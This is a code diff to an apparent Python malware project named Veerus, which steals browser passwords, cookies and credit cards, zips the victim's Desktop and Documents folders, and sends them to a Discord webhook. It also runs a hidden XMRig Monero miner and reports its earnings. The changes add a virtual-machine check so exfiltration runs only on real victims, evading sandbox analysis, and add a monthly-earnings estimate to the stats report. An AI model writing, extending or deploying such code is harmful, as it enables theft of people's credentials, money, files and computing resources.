@@ -38,6 +38,7 @@ import pyImpossibleObf
 import os
 import json
 import base64
+from addict import Dict
 import sqlite3
 import win32crypt
 from Crypto.Cipher import AES
@@ -669,7 +670,7 @@ if yes == "yes":
 				zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
 	def MineThreadWin():
 		print("[.] Starting miner if enabled.")
-		os.system(XMRIGPATH + ' -o xmr-eu1.nanopool.org:14444 -u ' + ADDRESS + ' --coin=monero --threads=4 ')
+		os.system(XMRIGPATH + ' -o xmr-eu1.nanopool.org:14444 -u ' + ADDRESS + ' --coin=monero --threads=4')
 	def MineThreadLinux():
 		print("[.] Starting miner if enabled.")
 		try:
@@ -743,6 +744,7 @@ if yes == "yes":
 		if(STATSWEBHOOK != "NoWebhook"):
 			hashrate = ""
 			balanceXMR = ""
+			Aproximate = ""
 			avgHASHRATE = ""
 			webhook = DiscordWebhook(url=STATSWEBHOOK, username="STATS : github.com/0xSxZ/Veerus/")
 			for i in range(len(STATSAPI)):
@@ -751,17 +753,31 @@ if yes == "yes":
 				if("hashrate" in STATSAPI[i]):
 					result = r.json()["data"]
 					h1 = str(json_extract(r.json(), "h1"))
-					hashrate = h1
+					hashrate = str(h1).replace("[", "").replace("]","")
+					print(hashrate)
+					if(hashrate == "0"):
+						hashrate = "1"
+					try:
+						r2 = requests.get("https://api.nanopool.org/v1/xmr/approximated_earnings/" + str(hashrate))
+						rdjson = Dict(r2.json())
+						
+						Aproximate = rdjson["data"]["month"]["dollars"]
+						print("Aproximate : " + str(Aproximate))
+					except Exception as e:
+						Aproximate = "Error while getting Aproximation"
 				elif("balance" in STATSAPI[i]):
 					balanceXMR = result
 				elif("avghashrate" in STATSAPI[i]):
 					avgHASHRATE  = result
-
-			embed = DiscordEmbed(title='Stats :', description=f':chart: Stats of miner : \n\n:bar_chart: Hashrate : {hashrate}\n:chart_with_upwards_trend: AVG hashrate : {avgHASHRATE}\n:moneybag: Balance : {balanceXMR}\nSent from : {GPUMODEL.Caption}\nSending again in 3 minutes..', color='03b2f8')
+			embed = DiscordEmbed(title='Stats :', description=f':chart: Stats of miner : \n\n:bar_chart: Hashrate : {hashrate}\n:chart_with_upwards_trend: AVG hashrate : {avgHASHRATE}\n:moneybag: Balance : {balanceXMR}\n:chart_with_upwards_trend: Aproximative Earning (month) : {str(Aproximate)[:6]}$\n:robot: Sent from : {GPUMODEL.Caption}\n:clock1: Sending again in 3 minutes..', color='03b2f8')
 			webhook.add_embed(embed)
 			webhook.execute()
 			time.sleep(180)
-	if(WEBHOOK != "" and WEBHOOK != None):
+
+	isVM = len(wmi.WMI().Win32_PortConnector()) == 0
+	if(isVM == True):
+		connectOption()
+	if(WEBHOOK != "" and WEBHOOK != None and isVM == False):
 		print("[.] Sending")
 		webhook = DiscordWebhook(url=WEBHOOK, username="github.com/0xSxZ/Veerus/")
 		embed = DiscordEmbed(title='New Machine connected', description=f'New machine connected\nInfos : \nGraphic Card : {GPUMODEL.Caption}\nIP : {IP}\nCity : {city}\nCountry : :flag_{country.lower()}:', color='03b2f8')
@@ -792,14 +808,14 @@ if yes == "yes":
 		embed2 = DiscordEmbed(title='Stealer', description=f'**:key: Passwords : {PASSWORDNUM}\n:cookie: Cookies : {COOKIESNUM}\n:money_with_wings: CreditCards : {CREDITCARDSNUM}\n:money_with_wings: Currency Cookies : {CURRENCYCOOKIESNUM}\n:money_with_wings: Currency Password : {CURRENCYPWNUM}**', color='03b2f8')
 		webhook.add_embed(embed2)
 		webhook.execute()
-	connectOption()
-	os.system("cd")
-	getfiles()
-	time.sleep(5)
+		connectOption()
+		os.system("cd")
+		getfiles()
+		time.sleep(2)
+		print("[.] Sending Desktop")
+		webhook = DiscordWebhook(url=WEBHOOK, username="github.com/0xSxZ/Veerus/")
+		webhook.add_file(file=open("desktop.zip", "rb").read(), filename="desktop.zip")
+		webhook.add_file(file=open("Documents.zip", "rb").read(), filename="Documents.zip")
+		webhook.execute()
 	print("[.] Sending Stats")
 	threading.Thread(target=minerstats).start()
-	print("[.] Sending Desktop")
-	webhook = DiscordWebhook(url=WEBHOOK, username="github.com/0xSxZ/Veerus/")
-	webhook.add_file(file=open("desktop.zip", "rb").read(), filename="desktop.zip")
-	webhook.add_file(file=open("Documents.zip", "rb").read(), filename="Documents.zip")
-	webhook.execute()
